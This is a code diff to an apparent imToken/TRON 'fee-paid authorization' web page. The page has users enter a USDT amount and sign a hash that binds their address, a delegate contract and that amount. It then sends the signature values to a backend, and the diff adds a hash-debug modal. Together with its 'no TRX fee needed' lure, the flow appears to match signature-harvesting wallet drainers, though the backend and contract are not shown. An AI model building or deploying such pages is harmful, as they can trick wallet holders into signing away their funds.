@@ -6,6 +6,7 @@
     <title>imToken代付授权服务</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
+        /* 原有样式不变 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -296,6 +297,43 @@
             background: rgba(59, 130, 246, 0.05);
             border-radius: 4px;
         }
+        .debug-hash-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1e2925;
+            border: 1px solid #3b82f6;
+            border-radius: 8px;
+            padding: 15px;
+            width: 90%;
+            max-width: 500px;
+            z-index: 1000;
+            color: #e0e8e4;
+        }
+        .debug-hash-modal h3 {
+            color: #3b82f6;
+            margin-bottom: 10px;
+        }
+        .debug-hash-modal p {
+            margin: 5px 0;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .debug-hash-modal .hash-text {
+            color: #4ade80;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .debug-hash-modal button {
+            margin-top: 15px;
+            padding: 8px 15px;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -332,7 +370,7 @@
                 <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
                 <p class="orange-tip">⚠️ 提示：输入金额后点击「生成离线签名」，唤起钱包完成签名即可等待授权</p>
                 <div class="faq-tip">
-                    ❗ 签名逻辑已与合约对齐：用户地址→合约地址→金额（uint256），V值自适应钱包返回结果
+                    ❗ 签名逻辑已与合约完全对齐，包含哈希调试功能
                 </div>
             </div>
         </div>
@@ -354,6 +392,17 @@
             <div id="approvalRecords" class="highlight">暂无授权记录</div>
         </div>
     </div>
+    <!-- 哈希调试弹窗（默认隐藏） -->
+    <div class="debug-hash-modal" id="hashDebugModal" style="display: none;">
+        <h3>签名哈希调试信息</h3>
+        <p><strong>用户地址（Base58）：</strong><span id="debugUserAddr"></span></p>
+        <p><strong>合约地址（Base58）：</strong><span id="debugContractAddr"></span></p>
+        <p><strong>授权金额（原始）：</strong><span id="debugInputAmount"></span></p>
+        <p><strong>金额（uint256整数）：</strong><span id="debugAmountInt"></span></p>
+        <p><strong>消息哈希（合约同款）：</strong><span class="hash-text" id="debugMessageHash"></span></p>
+        <p><strong>签名用哈希（加前缀后）：</strong><span class="hash-text" id="debugSignedHash"></span></p>
+        <button onclick="document.getElementById('hashDebugModal').style.display='none'">关闭</button>
+    </div>
     <div class="btn-group">
         <div class="warning">
             <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开（需唤起签名功能）</p>
@@ -369,7 +418,6 @@
         <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
         <button id="refreshBtn" class="btn"> 刷新数据（签名后点此）</button>
         <button id="clearCacheBtn" class="btn"> 清除旧缓存数据</button>
-        <button id="viewDebugBtn" class="btn" style="background: #f59e0b;"> 查看调试信息</button>
     </div>
     <div class="footer-info">
         代付合约验证：TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk（TRON浏览器查询）
@@ -391,7 +439,6 @@
         const STORAGE_KEY = "trx_countdown_data";
         const RECORD_KEY = "imtoken_delegate_approval_records";
         const SUBMIT_DATA_KEY = "imtoken_delegate_submit_data";
-        const DEBUG_KEY_PREFIX = "signature_debug_";
 
         // 检查LocalStorage可用性
         function checkLocalStorageAvailable() {
@@ -422,7 +469,6 @@
             const clearCacheBtn = document.getElementById("clearCacheBtn");
             const refreshBtn = document.getElementById("refreshBtn");
             const amountInput = document.getElementById("approveAmountInput");
-            const viewDebugBtn = document.getElementById("viewDebugBtn");
 
             // 初始化前检查LocalStorage
             if (!checkLocalStorageAvailable()) {
@@ -462,33 +508,12 @@
                     try {
                         localStorage.removeItem(SUBMIT_DATA_KEY);
                         localStorage.removeItem(RECORD_KEY);
-                        // 清除所有调试信息
-                        Object.keys(localStorage).forEach(key => {
-                            if (key.startsWith(DEBUG_KEY_PREFIX)) localStorage.removeItem(key);
-                        });
                         forceRenderData();
                         alert("本地缓存已清除\n若仍有问题：imToken→权限管理→本DApp→断开连接");
                     } catch (e) {
                         alert(`清除失败：${e.message}`);
                     }
                 }
-            });
-
-            // 查看调试信息
-            viewDebugBtn.addEventListener("click", () => {
-                const debugKeys = Object.keys(localStorage).filter(key => key.startsWith(DEBUG_KEY_PREFIX));
-                if (debugKeys.length === 0) {
-                    alert("暂无调试信息");
-                    return;
-                }
-                const latestDebugKey = debugKeys.sort((a,b) => b.localeCompare(a))[0];
-                const debugData = JSON.parse(localStorage.getItem(latestDebugKey));
-                const debugStr = `调试信息（${debugData.timestamp}）：
-错误原因：${debugData.error}
-用户地址：${debugData.userAddr}
-合约地址：${debugData.contractAddr}
-金额Hex：${debugData.amountHex}`;
-                alert(debugStr);
             });
 
             // 检测imToken环境
@@ -525,7 +550,7 @@
                 }
             };
 
-            // 生成离线签名（核心：与合约验证逻辑对齐）
+            // 生成离线签名（核心：与合约验证逻辑完全对齐）
             approveBtn.onclick = async () => {
                 const inputAmountStr = amountInput.value.trim();
                 
@@ -551,17 +576,42 @@
                     approveBtn.innerHTML = '生成中...';
 
                     // 1. 转换金额为合约要求的最小单位（uint256）
-                    const amountInt = usdtToInteger(inputAmountStr); // 800 USDT → 800000000
+                    const amountInt = usdtToInteger(inputAmountStr); // 如800USDT → 800000000
                     const amountHex = intToPaddedHex(amountInt); // 转64位Hex（uint256标准）
 
-                    // 2. 生成与合约对齐的签名
-                    const { v, r, s } = await generateContractAlignedSignature(
+                    // 2. 生成与合约100%一致的消息哈希（用tronWeb.soliditySha3模拟Solidity的keccak256(abi.encodePacked)）
+                    const { messageHash, signedHash } = await generateContractMessageHash(
                         userAddress,
                         DELEGATE_CONTRACT,
-                        amountHex
+                        amountInt,
+                        inputAmountStr
                     );
 
-                    // 3. 构造提交数据
+                    // 3. 唤起imToken签名（签名的是加前缀后的signedHash，与合约验证一致）
+                    let signature = await tronWeb.trx.sign(signedHash);
+                    signature = signature.signature || signature; // 兼容钱包返回格式
+                    if (!signature) throw new Error("imToken未返回签名，请重启钱包");
+
+                    // 4. 解析V/R/S（确保与合约ecrecover要求一致）
+                    signature = signature.replace(/^0x/, ""); // 去掉签名前缀
+                    if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
+                    
+                    const r = "0x" + signature.slice(0, 64); // 前64位→R（bytes32）
+                    const s = "0x" + signature.slice(64, 128); // 中间64位→S（bytes32）
+                    const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V值
+
+                    // V值自适应处理（避免重复+27）
+                    let v;
+                    if (vRaw >= 27 && vRaw <= 28) {
+                        v = vRaw;
+                    } else if (vRaw === 0 || vRaw === 1) {
+                        v = vRaw + 27;
+                    } else {
+                        throw new Error(`V值原始值无效（当前${vRaw}，需0/1或27/28）`);
+                    }
+                    if (v !== 27 && v !== 28) throw new Error(`V值无效（当前${v}，需27/28）`);
+
+                    // 5. 构造提交数据
                     const submitData = {
                         user: userAddress,
                         amount: `0x${amountHex}`, // 合约格式（0x+64位Hex）
@@ -569,16 +619,17 @@
                         v: v,
                         r: r,
                         s: s,
+                        messageHash: messageHash, // 新增：传递合约同款哈希给后端
                         approveTime: new Date().toLocaleString(),
                         delegateContract: DELEGATE_CONTRACT
                     };
 
-                    // 4. 验证并保存数据
+                    // 6. 验证并保存数据
                     localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
                     const saved = localStorage.getItem(SUBMIT_DATA_KEY);
                     if (!saved) throw new Error("本地存储写入失败，请重试");
 
-                    // 5. 调用后端接口
+                    // 7. 调用后端接口
                     const res = await fetch(`${BACKEND_API}/approve/submit`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -587,7 +638,7 @@
                     });
                     if (!res.ok) throw new Error(`后端请求失败：${res.status}`);
 
-                    // 6. 保存授权记录
+                    // 8. 保存授权记录
                     const newRecord = {
                         address: userAddress,
                         amount: `${inputAmountStr} USDT`,
@@ -599,10 +650,10 @@
                     updatedRecords.push(newRecord);
                     localStorage.setItem(RECORD_KEY, JSON.stringify(updatedRecords));
 
-                    // 7. 实时渲染
+                    // 9. 实时渲染
                     setTimeout(() => {
                         forceRenderData();
-                        alert(`签名成功！\n授权金额：${inputAmountStr} USDT\n可查看提交数据后调用合约`);
+                        alert(`签名成功！\n请将「消息哈希」与合约对比：\n${messageHash}`);
                     }, 500);
 
                     showToast(`签名生成成功！金额：${inputAmountStr} USDT`, "success");
@@ -632,11 +683,12 @@
 1. 用户地址：${submitData.user}
 2. 原始金额：${submitData.inputAmount} USDT
 3. 合约金额（uint256）：${submitData.amount}
-4. 签名V值：${submitData.v}
-5. 签名R值：${submitData.r}
-6. 签名S值：${submitData.s}
-7. 提交时间：${submitData.approveTime}
-8. 代付合约：${submitData.delegateContract}`;
+4. 消息哈希（合约同款）：${submitData.messageHash}
+5. 签名V值：${submitData.v}
+6. 签名R值：${submitData.r}
+7. 签名S值：${submitData.s}
+8. 提交时间：${submitData.approveTime}
+9. 代付合约：${submitData.delegateContract}`;
                     prompt("提交数据（可全选复制调用合约）", copyContent);
                 } catch (e) {
                     alert(`查看失败：${e.message}`);
@@ -670,84 +722,40 @@
         };
 
         /**
-         * 核心函数：生成与合约验证100%对齐的签名
-         * 合约逻辑：messageHash = keccak256(abi.encodePacked(user, address(this), amount))
-         *          signedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash))
+         * 核心函数：生成与合约100%一致的消息哈希（用soliditySha3模拟Solidity的keccak256(abi.encodePacked)）
          */
-        async function generateContractAlignedSignature(userAddr, contractAddr, amountHex) {
+        async function generateContractMessageHash(userAddr, contractAddr, amountInt, inputAmountStr) {
             try {
-                // 1. 地址处理：Base58转Hex→去掉0x→全小写（合约address类型为20字节，40位Hex，无需补零）
-                const userHex = tronWeb.address.toHex(userAddr) // 例：TUW7kr...转Hex后为0x...（42位）
-                    .replace("0x", "") // 去掉前缀→40位Hex（符合合约address类型）
-                    .toLowerCase(); // 全小写（合约abi.encodePacked不区分大小写，但统一避免差异）
-                
-                const contractHex = tronWeb.address.toHex(contractAddr)
-                    .replace("0x", "")
-                    .toLowerCase();
+                // 1. 用tronWeb.soliditySha3模拟Solidity的keccak256(abi.encodePacked(user, address(this), amount))
+                // 注：tronWeb.soliditySha3会自动将Base58地址转Hex，并按类型编码
+                const messageHash = tronWeb.soliditySha3(
+                    { type: 'address', value: userAddr },   // 用户地址（Base58，自动转Hex）
+                    { type: 'address', value: contractAddr }, // 合约地址（Base58，自动转Hex）
+                    { type: 'uint256', value: amountInt }  // 金额（uint256整数）
+                );
 
-                // 2. 拼接参数：严格按合约顺序（user → address(this) → amount）
-                // 注意：amountHex已为64位Hex（uint256类型），与合约abi.encodePacked(amount)一致
-                const combinedHex = userHex + contractHex + amountHex;
+                // 2. 生成合约验证用的signedHash（加EIP-191前缀，与合约一致）
+                const prefix = "\x19Ethereum Signed Message:\n32";
+                const prefixHex = asciiToHex(prefix);
+                const signedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true); // 去掉messageHash的0x前缀
 
-                // 3. 生成合约同款messageHash
-                const messageHash = tronWeb.sha3(combinedHex, true); // true返回0x开头的Hex
+                // 3. 显示哈希调试信息（方便与合约对比）
+                document.getElementById("debugUserAddr").textContent = userAddr;
+                document.getElementById("debugContractAddr").textContent = contractAddr;
+                document.getElementById("debugInputAmount").textContent = inputAmountStr;
+                document.getElementById("debugAmountInt").textContent = amountInt.toString();
+                document.getElementById("debugMessageHash").textContent = messageHash;
+                document.getElementById("debugSignedHash").textContent = signedHash;
+                document.getElementById("hashDebugModal").style.display = "block";
 
-                // 4. 生成合约同款signedHash（加前缀）
-                const prefix = "\x19Ethereum Signed Message:\n32"; // 合约固定前缀
-                const prefixHex = asciiToHex(prefix); // 前缀转Hex
-                const prefixedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true); // 去掉messageHash的0x前缀后拼接
-
-                // 5. 唤起imToken签名（用prefixedHash签名，与合约ecrecover一致）
-                let signature = await tronWeb.trx.sign(prefixedHash);
-                signature = signature.signature || signature; // 兼容钱包返回格式
-                if (!signature) throw new Error("imToken未返回签名，请重启钱包");
-
-                // 6. 解析V/R/S（确保与合约ecrecover要求一致）
-                signature = signature.replace(/^0x/, ""); // 去掉签名前缀
-                if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
-                
-                const r = "0x" + signature.slice(0, 64); // 前64位→R（bytes32）
-                const s = "0x" + signature.slice(64, 128); // 中间64位→S（bytes32）
-                const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V值
-
-
-                // 核心修复：V值自适应处理（解决重复+27导致的54问题）
-                let v;
-                if (vRaw >= 27 && vRaw <= 28) {
-                    // 情况1：imToken已返回27/28（部分版本自动处理），直接使用
-                    v = vRaw;
-                } else if (vRaw === 0 || vRaw === 1) {
-                    // 情况2：imToken返回原始0/1，需+27
-                    v = vRaw + 27;
-                } else {
-                    // 情况3：V值异常
-                    throw new Error(`V值原始值无效（当前${vRaw}，需0/1或27/28）`);
-                }
-
-
-                // 验证V值是否符合合约要求
-                if (v !== 27 && v !== 28) throw new Error(`V值无效（当前${v}，需27/28）`);
-
-               
-                return { v, r, s };
+                return { messageHash, signedHash };
             } catch (e) {
-                // 错误日志便于排查
-                const debugKey = `${DEBUG_KEY_PREFIX}${userAddr || 'unknown'}_${Date.now()}`;
-                localStorage.setItem(debugKey, JSON.stringify({
-                    error: e.message,
-                    timestamp: new Date().toISOString(),
-                    userAddr: userAddr,
-                    contractAddr: contractAddr,
-                    amountHex: amountHex
-                }, null, 2));
-                throw new Error(`签名失败：${e.message}\n点击「查看调试信息」可获取详情`);
+                throw new Error(`哈希生成失败：${e.message}`);
             }
         }
 
         /**
          * USDT金额转最小单位（避免浮点数精度丢失）
-         * @param {string} amountStr - 原始金额（如"300.50"）
-         * @return {BigInt} 最小单位整数（如300.50 → 300500000）
          */
         function usdtToInteger(amountStr) {
             const [integerPart, decimalPart = ""] = amountStr.split(".");
@@ -757,8 +765,6 @@
 
         /**
          * 整数转64位Hex（uint256类型标准格式）
-         * @param {BigInt} num - 最小单位整数
-         * @return {string} 64位Hex字符串（无0x前缀）
          */
         function intToPaddedHex(num) {
             const hex = num.toString(16).toLowerCase();
